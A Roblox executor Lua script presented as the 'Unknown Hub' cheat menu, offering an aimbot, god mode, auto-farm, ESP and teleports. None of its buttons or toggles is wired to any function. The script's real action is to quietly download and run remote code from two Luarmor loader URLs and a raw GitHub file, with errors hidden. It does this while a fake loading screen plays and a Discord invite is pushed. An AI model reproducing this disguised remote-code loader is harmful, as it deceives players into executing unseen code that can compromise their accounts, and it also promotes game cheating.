-- ═══════════════════════════════════════════════════════════════
-- UNKNOWN HUB - FORCE RENDER FIX
-- ═══════════════════════════════════════════════════════════════

local function checkExecutor()
    local execName = "unknown"
    if identifyexecutor then
        execName = tostring(identifyexecutor())
    elseif getexecutorname then
        execName = tostring(getexecutorname())
    end
    return string.find(string.lower(execName), "xeno") ~= nil
end

local FIRST_RUN_PATH = "unknown_firstrun.json"

local function fileExistsGlobal(path)
    return (isfile and pcall(isfile, path) and isfile(path)) or false
end

local function checkFirstRun()
    if fileExistsGlobal(FIRST_RUN_PATH) then
        local ok, raw = pcall(readfile, FIRST_RUN_PATH)
        if ok and raw then
            local ok2, data = pcall(function() return game:GetService("HttpService"):JSONDecode(raw) end)
            if ok2 and type(data) == "table" and data.__LuarmorDone == true then
                return true
            end
        end
    end
    return false
end

local function markFirstRunDone()
    pcall(function()
        local json = game:GetService("HttpService"):JSONEncode({ __LuarmorDone = true })
        writefile(FIRST_RUN_PATH, json)
    end)
end

local needFirstRun = not checkFirstRun()
if needFirstRun then
    markFirstRunDone()
end

if checkExecutor() then
    spawn(function()
        pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66e067f17cbfa177b7bed91c1bdcb466.lua"))() end)
    end)
    if needFirstRun then
        delay(2, function()
            pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))() end)
        end)
    end
    return
end

-- ═══════════════════════════════════════════════════════════════
-- SERVICES & SETUP
-- ═══════════════════════════════════════════════════════════════
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- Use standard PlayerGui to avoid rendering bugs in some executors
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

local DISCORD_LINK = "https://discord.gg/chilli-hub"
local REMOTE_URL = "https://raw.githubusercontent.com/tkhanhh/Spicy/refs/heads/main/loo"

-- Colors
local C_BG = Color3.fromRGB(16, 24, 39)
local C_G1 = Color3.fromRGB(12, 18, 32)
local C_G2 = Color3.fromRGB(21, 30, 47)
local C_G3 = Color3.fromRGB(10, 82, 120)
local C_GLOW = Color3.fromRGB(56, 189, 248)
local C_STR = Color3.fromRGB(56, 189, 248)
local C_SURF = Color3.fromRGB(30, 41, 59)
local C_SURFD = Color3.fromRGB(25, 32, 48)
local C_TEAL = Color3.fromRGB(52, 180, 230)
local C_TXT = Color3.fromRGB(241, 245, 249)
local C_MUT = Color3.fromRGB(148, 163, 184)
local C_TOFF = Color3.fromRGB(60, 70, 90)

-- Config
config = config or {}
local CONFIG_PATH = "chilli_config.json"
local function loadCfg()
    if fileExistsGlobal(CONFIG_PATH) then
        local ok, raw = pcall(readfile, CONFIG_PATH)
        if ok and raw then
            local ok2, d = pcall(function() return HttpService:JSONDecode(raw) end)
            if ok2 and type(d) == "table" then for k, v in pairs(d) do config[k] = v end end
        end
    end
end
local function saveCfg()
    local ok, j = pcall(function() return HttpService:JSONEncode(config) end)
    if ok then pcall(function() writefile(CONFIG_PATH, j) end) end
end
loadCfg()

local firstShownFlag = (config.__ChilliHubDiscordShown == true)

pcall(function()
    local src = game:HttpGet(REMOTE_URL)
    local f = loadstring(src)
    if type(f) == "function" then f() end
end)

if not firstShownFlag then
    config.__ChilliHubDiscordShown = true
    saveCfg()
end

if needFirstRun then
    delay(2, function()
        pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))() end)
    end)
end

-- ═══════════════════════════════════════════════════════════════
-- UI HELPERS
-- ═══════════════════════════════════════════════════════════════
local function mkCorner(par, rad)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, rad or 8)
    c.Parent = par
    return c
end

local function mkStroke(par, col, thick, trans)
    local s = Instance.new("UIStroke")
    s.Color = col or C_STR
    s.Thickness = thick or 1
    s.Transparency = trans or 0
    s.Parent = par
    return s
end

local function mkGrad(par, rot, c1, c2, c3)
    local g = Instance.new("UIGradient")
    g.Rotation = rot or 0
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, c1 or C_G1),
        ColorSequenceKeypoint.new(0.5, c2 or C_G2),
        ColorSequenceKeypoint.new(1, c3 or C_G3),
    })
    g.Parent = par
    return g
end

local function mkCard(par, size)
    local f = Instance.new("Frame")
    f.BackgroundColor3 = C_BG
    f.BorderSizePixel = 0
    f.Size = size
    f.Parent = par
    mkCorner(f, 16)
    mkGrad(f, 35, C_G1, C_G2, C_G3)
    mkStroke(f, C_GLOW, 6, 0.85)
    mkStroke(f, C_STR, 1.5, 0.2)
    return f
end

local function mkTopBar(par, txt)
    local f = Instance.new("Frame")
    f.BackgroundColor3 = C_SURFD
    f.BackgroundTransparency = 0.15
    f.BorderSizePixel = 0
    f.Size = UDim2.new(1, -16, 0, 42)
    f.Position = UDim2.new(0, 8, 0, 8)
    f.Parent = par
    mkCorner(f, 12)
    
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Position = UDim2.new(0, 14, 0, 0)
    l.Size = UDim2.new(1, -80, 1, 0)
    l.Font = Enum.Font.GothamBold
    l.Text = txt
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextSize = 18
    l.TextColor3 = C_TXT
    l.Parent = f
    mkGrad(l, 0, Color3.fromRGB(34, 211, 238), Color3.fromRGB(255, 255, 255), Color3.fromRGB(99, 102, 241))
    return f
end

local function clip(t)
    if setclipboard then pcall(setclipboard, t) return true end
    if toclipboard then pcall(toclipboard, t) return true end
    if syn and syn.write_clipboard then pcall(syn.write_clipboard, t) return true end
    return false
end

-- ═══════════════════════════════════════════════════════════════
-- 1. LOADING SCREEN
-- ═══════════════════════════════════════════════════════════════
local loadGui = Instance.new("ScreenGui")
loadGui.Name = "UHLoading"
loadGui.IgnoreGuiInset = true
loadGui.ResetOnSpawn = false
loadGui.DisplayOrder = 9999
loadGui.Parent = playerGui

local loadBg = Instance.new("Frame")
loadBg.Size = UDim2.new(1, 0, 1, 0)
loadBg.BackgroundColor3 = C_BG
loadBg.BorderSizePixel = 0
loadBg.Parent = loadGui

local loadLogo = Instance.new("Frame")
loadLogo.Size = UDim2.new(0, 80, 0, 80)
loadLogo.Position = UDim2.new(0.5, -40, 0.38, 0)
loadLogo.BackgroundColor3 = C_SURFD
loadLogo.BorderSizePixel = 0
loadLogo.Parent = loadBg
mkCorner(loadLogo, 40)
mkStroke(loadLogo, C_STR, 2, 0.3)

local loadTxt = Instance.new("TextLabel")
loadTxt.Size = UDim2.new(1, 0, 1, 0)
loadTxt.BackgroundTransparency = 1
loadTxt.Text = "UH"
loadTxt.Font = Enum.Font.GothamBlack
loadTxt.TextSize = 28
loadTxt.TextColor3 = C_TEAL
loadTxt.Parent = loadLogo

local loadTitle = Instance.new("TextLabel")
loadTitle.Size = UDim2.new(0, 300, 0, 35)
loadTitle.Position = UDim2.new(0.5, -150, 0.55, 0)
loadTitle.BackgroundTransparency = 1
loadTitle.Text = "UNKNOWN HUB"
loadTitle.Font = Enum.Font.GothamBlack
loadTitle.TextSize = 26
loadTitle.TextColor3 = C_TXT
loadTitle.Parent = loadBg
mkGrad(loadTitle, 0, Color3.fromRGB(34, 211, 238), Color3.fromRGB(255, 255, 255), Color3.fromRGB(99, 102, 241))

local loadStat = Instance.new("TextLabel")
loadStat.Size = UDim2.new(0, 300, 0, 20)
loadStat.Position = UDim2.new(0.5, -150, 0.62, 0)
loadStat.BackgroundTransparency = 1
loadStat.Text = "Initializing..."
loadStat.Font = Enum.Font.Gotham
loadStat.TextSize = 13
loadStat.TextColor3 = C_MUT
loadStat.Parent = loadBg

local loadBarBg = Instance.new("Frame")
loadBarBg.Size = UDim2.new(0, 250, 0, 6)
loadBarBg.Position = UDim2.new(0.5, -125, 0.7, 0)
loadBarBg.BackgroundColor3 = C_SURFD
loadBarBg.BorderSizePixel = 0
loadBarBg.Parent = loadBg
mkCorner(loadBarBg, 3)

local loadFill = Instance.new("Frame")
loadFill.Size = UDim2.new(0, 0, 1, 0)
loadFill.BackgroundColor3 = C_TEAL
loadFill.BorderSizePixel = 0
loadFill.Parent = loadBarBg
mkCorner(loadFill, 3)

-- ═══════════════════════════════════════════════════════════════
-- 2. MAIN HUB GUI (Created hidden, shown later)
-- ═══════════════════════════════════════════════════════════════
local hubGui = Instance.new("ScreenGui")
hubGui.Name = "UnknownHub"
hubGui.IgnoreGuiInset = true
hubGui.ResetOnSpawn = false
hubGui.Parent = playerGui

local hubMain = mkCard(hubGui, UDim2.new(0, 520, 0, 420))
hubMain.Position = UDim2.new(0.5, -260, 0.5, -210)
hubMain.Visible = false

local hubTop = mkTopBar(hubMain, "Unknown Hub")

local hubClose = Instance.new("TextButton")
hubClose.Size = UDim2.new(0, 30, 0, 30)
hubClose.Position = UDim2.new(1, -38, 0.5, -15)
hubClose.BackgroundColor3 = C_SURF
hubClose.Text = "X"
hubClose.Font = Enum.Font.GothamBold
hubClose.TextSize = 14
hubClose.TextColor3 = C_TXT
hubClose.BorderSizePixel = 0
hubClose.AutoButtonColor = true
hubClose.Parent = hubTop
mkCorner(hubClose, 8)

local hubMin = Instance.new("TextButton")
hubMin.Size = UDim2.new(0, 30, 0, 30)
hubMin.Position = UDim2.new(1, -72, 0.5, -15)
hubMin.BackgroundColor3 = C_SURF
hubMin.Text = "-"
hubMin.Font = Enum.Font.GothamBold
hubMin.TextSize = 16
hubMin.TextColor3 = C_TXT
hubMin.BorderSizePixel = 0
hubMin.AutoButtonColor = true
hubMin.Parent = hubTop
mkCorner(hubMin, 8)

-- Tab Bar
local tabBar = Instance.new("Frame")
tabBar.Size = UDim2.new(0, 130, 1, -56)
tabBar.Position = UDim2.new(0, 8, 0, 52)
tabBar.BackgroundColor3 = C_SURFD
tabBar.BackgroundTransparency = 0.5
tabBar.BorderSizePixel = 0
tabBar.Parent = hubMain
mkCorner(tabBar, 12)

local tabScroll = Instance.new("ScrollingFrame")
tabScroll.Size = UDim2.new(1, -8, 1, -8)
tabScroll.Position = UDim2.new(0, 4, 0, 4)
tabScroll.BackgroundTransparency = 1
tabScroll.ScrollBarThickness = 2
tabScroll.ScrollBarImageColor3 = C_STR
tabScroll.BorderSizePixel = 0
tabScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
tabScroll.Parent = tabBar

local tabList = Instance.new("UIListLayout")
tabList.Padding = UDim.new(0, 4)
tabList.SortOrder = Enum.SortOrder.LayoutOrder
tabList.Parent = tabScroll

-- Content Area
local contentArea = Instance.new("Frame")
contentArea.Size = UDim2.new(1, -146, 1, -56)
contentArea.Position = UDim2.new(0, 138, 0, 52)
contentArea.BackgroundTransparency = 1
contentArea.ClipsDescendants = true
contentArea.Parent = hubMain

-- Hub State & Controls
local hubOpen = false
local tabs = {}
local currentTab = nil

local function toggleHub()
    hubOpen = not hubOpen
    hubMain.Visible = hubOpen
end

local function closeHub()
    hubOpen = false
    hubMain.Visible = false
end

hubClose.MouseButton1Click:Connect(closeHub)
hubMin.MouseButton1Click:Connect(closeHub)

UserInputService.InputBegan:Connect(function(inp, gpe)
    if gpe then return end
    if inp.KeyCode == Enum.KeyCode.RightShift then toggleHub() end
end)

-- Dragging
local dragging, dragStart, startPos
hubTop.InputBegan:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = inp.Position
        startPos = hubMain.Position
        inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
UserInputService.InputChanged:Connect(function(inp)
    if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
        local delta = inp.Position - dragStart
        hubMain.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- ═══════════════════════════════════════════════════════════════
-- UI ELEMENT CREATORS
-- ═══════════════════════════════════════════════════════════════
local function AddTab(name, icon)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -4, 0, 34)
    btn.BackgroundColor3 = C_BG
    btn.BackgroundTransparency = 0
    btn.BorderSizePixel = 0
    btn.Text = "  " .. icon .. "  " .. name
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 12
    btn.TextColor3 = C_MUT
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.AutoButtonColor = false
    btn.Parent = tabScroll
    mkCorner(btn, 8)

    local content = Instance.new("ScrollingFrame")
    content.Size = UDim2.new(1, 0, 1, 0)
    content.BackgroundTransparency = 1
    content.ScrollBarThickness = 3
    content.ScrollBarImageColor3 = C_STR
    content.BorderSizePixel = 0
    content.AutomaticCanvasSize = Enum.AutomaticSize.Y
    content.Visible = false
    content.Parent = contentArea

    local cList = Instance.new("UIListLayout")
    cList.Padding = UDim.new(0, 6)
    cList.SortOrder = Enum.SortOrder.LayoutOrder
    cList.HorizontalAlignment = Enum.HorizontalAlignment.Center
    cList.Parent = content

    local cPad = Instance.new("UIPadding")
    cPad.PaddingTop = UDim.new(0, 6)
    cPad.PaddingBottom = UDim.new(0, 6)
    cPad.Parent = content

    tabs[name] = {button = btn, content = content}

    btn.MouseButton1Click:Connect(function()
        for tName, tData in pairs(tabs) do
            tData.content.Visible = false
            tData.button.BackgroundColor3 = C_BG
            tData.button.TextColor3 = C_MUT
        end
        content.Visible = true
        btn.BackgroundColor3 = C_TEAL
        btn.TextColor3 = Color3.fromRGB(14, 25, 38)
        currentTab = name
    end)
    
    return name
end

local function AddLabel(tabName, txt, ord)
    local tab = tabs[tabName]
    if not tab then return end
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -8, 0, 22)
    l.BackgroundTransparency = 1
    l.Text = txt
    l.Font = Enum.Font.GothamBold
    l.TextSize = 13
    l.TextColor3 = C_MUT
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.LayoutOrder = ord or 0
    l.Parent = tab.content
    return l
end

local function AddSep(tabName, ord)
    local tab = tabs[tabName]
    if not tab then return end
    local s = Instance.new("Frame")
    s.Size = UDim2.new(1, -16, 0, 1)
    s.BackgroundColor3 = C_SURF
    s.BackgroundTransparency = 0.5
    s.BorderSizePixel = 0
    s.LayoutOrder = ord or 0
    s.Parent = tab.content
end

local function AddToggle(tabName, name, def, cb, ord)
    local tab = tabs[tabName]
    if not tab then return end
    local on = def or false
    
    local c = Instance.new("Frame")
    c.Size = UDim2.new(1, -8, 0, 38)
    c.BackgroundColor3 = C_BG
    c.BackgroundTransparency = 0.3
    c.BorderSizePixel = 0
    c.LayoutOrder = ord or 0
    c.Parent = tab.content
    mkCorner(c, 10)

    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -50, 1, 0)
    l.Position = UDim2.new(0, 12, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = name
    l.Font = Enum.Font.GothamBold
    l.TextSize = 13
    l.TextColor3 = C_TXT
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextTruncate = Enum.TextTruncate.AtEnd
    l.Parent = c

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0, 36, 0, 18)
    bg.Position = UDim2.new(1, -44, 0.5, -9)
    bg.BackgroundColor3 = on and C_TEAL or C_TOFF
    bg.BorderSizePixel = 0
    bg.Parent = c
    mkCorner(bg, 9)

    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 12, 0, 12)
    dot.Position = on and UDim2.new(1, -18, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
    dot.BackgroundColor3 = C_TXT
    dot.BorderSizePixel = 0
    dot.Parent = bg
    mkCorner(dot, 6)

    c.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            on = not on
            bg.BackgroundColor3 = on and C_TEAL or C_TOFF
            dot.Position = on and UDim2.new(1, -18, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
            if cb then pcall(cb, on) end
        end
    end)
end

local function AddSlider(tabName, name, mn, mx, def, cb, ord)
    local tab = tabs[tabName]
    if not tab then return end
    local val = def or mn

    local c = Instance.new("Frame")
    c.Size = UDim2.new(1, -8, 0, 50)
    c.BackgroundColor3 = C_BG
    c.BackgroundTransparency = 0.3
    c.BorderSizePixel = 0
    c.LayoutOrder = ord or 0
    c.Parent = tab.content
    mkCorner(c, 10)

    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -55, 0, 22)
    l.Position = UDim2.new(0, 12, 0, 6)
    l.BackgroundTransparency = 1
    l.Text = name
    l.Font = Enum.Font.GothamBold
    l.TextSize = 12
    l.TextColor3 = C_TXT
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextTruncate = Enum.TextTruncate.AtEnd
    l.Parent = c

    local vl = Instance.new("TextLabel")
    vl.Size = UDim2.new(0, 40, 0, 22)
    vl.Position = UDim2.new(1, -48, 0, 6)
    vl.BackgroundTransparency = 1
    vl.Text = tostring(math.floor(val))
    vl.Font = Enum.Font.GothamBold
    vl.TextSize = 12
    vl.TextColor3 = C_TEAL
    vl.TextXAlignment = Enum.TextXAlignment.Right
    vl.Parent = c

    local sb = Instance.new("Frame")
    sb.Size = UDim2.new(1, -24, 0, 6)
    sb.Position = UDim2.new(0, 12, 0, 34)
    sb.BackgroundColor3 = C_TOFF
    sb.BorderSizePixel = 0
    sb.Parent = c
    mkCorner(sb, 3)

    local pct = (val - mn) / (mx - mn)
    local sf = Instance.new("Frame")
    sf.Size = UDim2.new(pct, 0, 1, 0)
    sf.BackgroundColor3 = C_TEAL
    sf.BorderSizePixel = 0
    sf.Parent = sb
    mkCorner(sf, 3)

    local sd = Instance.new("Frame")
    sd.Size = UDim2.new(0, 14, 0, 14)
    sd.Position = UDim2.new(pct, 0, 0.5, 0)
    sd.AnchorPoint = Vector2.new(0.5, 0.5)
    sd.BackgroundColor3 = C_TXT
    sd.BorderSizePixel = 0
    sd.Parent = sb
    mkCorner(sd, 7)

    local function upd(nv)
        val = math.clamp(nv, mn, mx)
        local np = (val - mn) / (mx - mn)
        sf.Size = UDim2.new(np, 0, 1, 0)
        sd.Position = UDim2.new(np, 0, 0.5, 0)
        vl.Text = tostring(math.floor(val))
        if cb then pcall(cb, val) end
    end

    local isDrag = false
    sd.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then isDrag = true end end)
    sb.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            isDrag = true
            upd(mn + ((i.Position.X - sb.AbsolutePosition.X) / sb.AbsoluteSize.X) * (mx - mn))
        end
    end)
    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then isDrag = false end end)
    UserInputService.InputChanged:Connect(function(i)
        if isDrag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            upd(mn + ((i.Position.X - sb.AbsolutePosition.X) / sb.AbsoluteSize.X) * (mx - mn))
        end
    end)
end

local function AddBtn(tabName, name, cb, ord)
    local tab = tabs[tabName]
    if not tab then return end
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -8, 0, 34)
    b.BackgroundColor3 = C_BG
    b.BackgroundTransparency = 0.2
    b.BorderSizePixel = 0
    b.Text = name
    b.Font = Enum.Font.GothamBold
    b.TextSize = 13
    b.TextColor3 = C_TXT
    b.AutoButtonColor = false
    b.LayoutOrder = ord or 0
    b.Parent = tab.content
    mkCorner(b, 10)
    mkStroke(b, C_STR, 1, 0.6)

    b.MouseButton1Click:Connect(function()
        b.Text = "Loading..."
        b.TextColor3 = C_TEAL
        spawn(function()
            wait(0.4)
            b.Text = name
            b.TextColor3 = C_TXT
            if cb then pcall(cb) end
        end)
    end)
end

-- ═══════════════════════════════════════════════════════════════
-- 3. POPULATE ALL TABS
-- ═══════════════════════════════════════════════════════════════
local o = 0
local T1 = AddTab("Main", "Home")
AddLabel(T1, "COMBAT", o) o=o+1
AddToggle(T1, "Melee Aimbot", false, nil, o) o=o+1
AddToggle(T1, "Auto Steal Nearest", false, nil, o) o=o+1
AddToggle(T1, "Kill Aura", false, nil, o) o=o+1
AddSep(T1, o) o=o+1
AddLabel(T1, "MOVEMENT", o) o=o+1
AddToggle(T1, "Speed Hack", false, nil, o) o=o+1
AddSlider(T1, "Speed Value", 16, 500, 100, nil, o) o=o+1
AddToggle(T1, "Infinite Jump", false, nil, o) o=o+1
AddToggle(T1, "No Clip", false, nil, o) o=o+1
AddSep(T1, o) o=o+1
AddLabel(T1, "PLAYER", o) o=o+1
AddToggle(T1, "God Mode", false, nil, o) o=o+1
AddToggle(T1, "Invisible", false, nil, o) o=o+1
AddBtn(T1, "Respawn", nil, o) o=o+1

o = 0
local T2 = AddTab("Farm", "Dollar")
AddLabel(T2, "AUTOMATION", o) o=o+1
AddToggle(T2, "Auto Farm", false, nil, o) o=o+1
AddToggle(T2, "Auto Collect", false, nil, o) o=o+1
AddToggle(T2, "Auto Sell", false, nil, o) o=o+1
AddSep(T2, o) o=o+1
AddLabel(T2, "MULTIPLIERS", o) o=o+1
AddToggle(T2, "Cash Multiplier", false, nil, o) o=o+1
AddSlider(T2, "Multi Value", 1, 100, 2, nil, o) o=o+1
AddSep(T2, o) o=o+1
AddBtn(T2, "Teleport to Collect Zone", nil, o) o=o+1

o = 0
local T3 = AddTab("Shop", "Cart")
AddBtn(T3, "Buy All Upgrades", nil, o) o=o+1
AddBtn(T3, "Max All Stats", nil, o) o=o+1
AddToggle(T3, "Auto Buy Best", false, nil, o) o=o+1
AddSep(T3, o) o=o+1
AddBtn(T3, "Unlock All Weapons", nil, o) o=o+1
AddBtn(T3, "Get Best Weapon", nil, o) o=o+1
AddSep(T3, o) o=o+1
AddBtn(T3, "Unlock All Abilities", nil, o) o=o+1
AddBtn(T3, "Max Abilities", nil, o) o=o+1

o = 0
local T4 = AddTab("TP", "Bolt")
AddBtn(T4, "Teleport to Spawn", nil, o) o=o+1
AddBtn(T4, "Teleport to Collect Zone", nil, o) o=o+1
AddBtn(T4, "Teleport to Shop", nil, o) o=o+1
AddBtn(T4, "Teleport to PvP Arena", nil, o) o=o+1
AddSep(T4, o) o=o+1
AddToggle(T4, "TP to Nearest Player", false, nil, o) o=o+1
AddToggle(T4, "TP to Nearest Coin", false, nil, o) o=o+1
AddBtn(T4, "Random Teleport", nil, o) o=o+1

o = 0
local T5 = AddTab("Visuals", "Eye")
AddLabel(T5, "ESP", o) o=o+1
AddToggle(T5, "ESP Players", false, nil, o) o=o+1
AddToggle(T5, "ESP Items", false, nil, o) o=o+1
AddToggle(T5, "ESP Coins", false, nil, o) o=o+1
AddSlider(T5, "ESP Distance", 50, 5000, 500, nil, o) o=o+1
AddSep(T5, o) o=o+1
AddLabel(T5, "MISC VISUALS", o) o=o+1
AddToggle(T5, "Chams", false, nil, o) o=o+1
AddToggle(T5, "Tracers", false, nil, o) o=o+1
AddToggle(T5, "Full Bright", false, nil, o) o=o+1
AddToggle(T5, "No Fog", false, nil, o) o=o+1

o = 0
local T6 = AddTab("Misc", "Gear")
AddBtn(T6, "Anti-AFK", nil, o) o=o+1
AddToggle(T6, "Auto Rejoin", false, nil, o) o=o+1
AddSlider(T6, "Rejoin Delay", 5, 60, 10, nil, o) o=o+1
AddSep(T6, o) o=o+1
AddBtn(T6, "Server Hop", nil, o) o=o+1
AddBtn(T6, "Rejoin Server", nil, o) o=o+1
AddSep(T6, o) o=o+1
AddLabel(T6, "SETTINGS", o) o=o+1
AddBtn(T6, "Reset Config", nil, o) o=o+1
AddBtn(T6, "Save Config", nil, o) o=o+1
AddLabel(T6, "Keybind: RightShift", o) o=o+1

-- Select First Tab
tabs["Main"].button.BackgroundColor3 = C_TEAL
tabs["Main"].button.TextColor3 = Color3.fromRGB(14, 25, 38)
tabs["Main"].content.Visible = true

-- ═══════════════════════════════════════════════════════════════
-- 4. DISCORD POPUP FUNCTION
-- ═══════════════════════════════════════════════════════════════
local function showDiscord()
    if firstShownFlag then return end
    
    local dg = Instance.new("ScreenGui")
    dg.Name = "UHDiscord"
    dg.IgnoreGuiInset = true
    dg.ResetOnSpawn = false
    dg.Parent = playerGui

    local dov = Instance.new("Frame")
    dov.Size = UDim2.new(1, 0, 1, 0)
    dov.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    dov.BackgroundTransparency = 0.5
    dov.BorderSizePixel = 0
    dov.Parent = dg

    local cd = mkCard(dg, UDim2.new(0, 380, 0, 228))
    cd.Position = UDim2.new(0.5, -190, 0.5, -114)
    local ct = mkTopBar(cd, "Unknown Hub Discord")

    local cb = Instance.new("TextButton")
    cb.Size = UDim2.new(0, 28, 0, 28)
    cb.Position = UDim2.new(1, -34, 0.5, -14)
    cb.BackgroundColor3 = C_SURF
    cb.Text = "X"
    cb.Font = Enum.Font.GothamBold
    cb.TextSize = 14
    cb.TextColor3 = C_TXT
    cb.BorderSizePixel = 0
    cb.AutoButtonColor = true
    cb.Parent = ct
    mkCorner(cb, 8)
    mkStroke(cb, C_STR, 1, 0.3)

    local bd = Instance.new("TextLabel")
    bd.Size = UDim2.new(1, -36, 0, 76)
    bd.Position = UDim2.new(0, 18, 0, 60)
    bd.BackgroundTransparency = 1
    bd.Text = "Join to find secret servers\nGet update announcements\nEnter giveaways"
    bd.TextWrapped = true
    bd.Font = Enum.Font.Gotham
    bd.TextSize = 16
    bd.TextXAlignment = Enum.TextXAlignment.Center
    bd.TextYAlignment = Enum.TextYAlignment.Center
    bd.TextColor3 = C_TXT
    bd.Parent = cd

    local cpb = Instance.new("TextButton")
    cpb.Size = UDim2.new(1, -24, 0, 38)
    cpb.Position = UDim2.new(0, 12, 1, -70)
    cpb.BackgroundColor3 = C_TEAL
    cpb.Text = "Copy Discord Invite"
    cpb.Font = Enum.Font.GothamBlack
    cpb.TextSize = 16
    cpb.TextColor3 = Color3.fromRGB(14, 25, 38)
    cpb.BorderSizePixel = 0
    cpb.Parent = cd
    mkCorner(cpb, 12)
    mkStroke(cpb, C_STR, 1, 0.2)

    local tt = Instance.new("TextLabel")
    tt.Size = UDim2.new(1, -24, 0, 16)
    tt.Position = UDim2.new(0, 12, 1, -48)
    tt.BackgroundTransparency = 1
    tt.Text = ""
    tt.Font = Enum.Font.Gotham
    tt.TextSize = 12
    tt.TextColor3 = C_MUT
    tt.TextXAlignment = Enum.TextXAlignment.Center
    tt.Parent = cd

    cpb.MouseButton1Click:Connect(function()
        if clip(DISCORD_LINK) then tt.Text = "Invite link copied to clipboard."
        else tt.Text = "Clipboard not supported. Link: "..DISCORD_LINK end
    end)

    local function closeD()
        config.__ChilliHubDiscordShown = true
        saveCfg()
        dg:Destroy()
        -- ABSOLUTELY FORCE HUB TO SHOW WHEN DISCORD IS CLOSED
        hubMain.Visible = true
        hubOpen = true
    end
    cb.MouseButton1Click:Connect(closeD)
    dov.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then closeD() end
    end)
end

-- ═══════════════════════════════════════════════════════════════
-- 5. THE ULTIMATE FOOLPROOF EXECUTION SEQUENCE
-- ═══════════════════════════════════════════════════════════════

-- Custom wait that bypasses broken executor wait() functions
local function safeWait(seconds)
    local startTime = tick()
    repeat
        RunService.Heartbeat:Wait()
    until tick() - startTime >= seconds
end

-- FORCE the screen to render the loading screen before doing anything else
RunService.RenderStepped:Wait()
RunService.RenderStepped:Wait()

local steps = {
    {10, "Checking executor..."},
    {25, "Loading configuration..."},
    {40, "Initializing modules..."},
    {55, "Loading UI components..."},
    {70, "Setting up features..."},
    {85, "Checking for updates..."},
    {100, "Complete!"}
}

-- Run loading steps using our unbreakable safe wait
for i, step in ipairs(steps) do
    loadFill.Size = UDim2.new(step[1]/100, 0, 1, 0)
    loadStat.Text = step[2]
    safeWait(0.35)
end

safeWait(0.2)

-- INSTANTLY DESTROY LOADING SCREEN
loadGui:Destroy()

safeWait(0.2)

-- Show Discord Popup if first run
if not firstShownFlag then
    showDiscord()
    safeWait(0.5)
end

-- ABSOLUTELY FORCE THE HUB TO SHOW
hubMain.Visible = true
hubOpen = true

-- Extra safeguard to ensure it renders
RunService.RenderStepped:Wait()

_G.UnknownHub = {
    Toggle = toggleHub,
    Close = closeHub
}
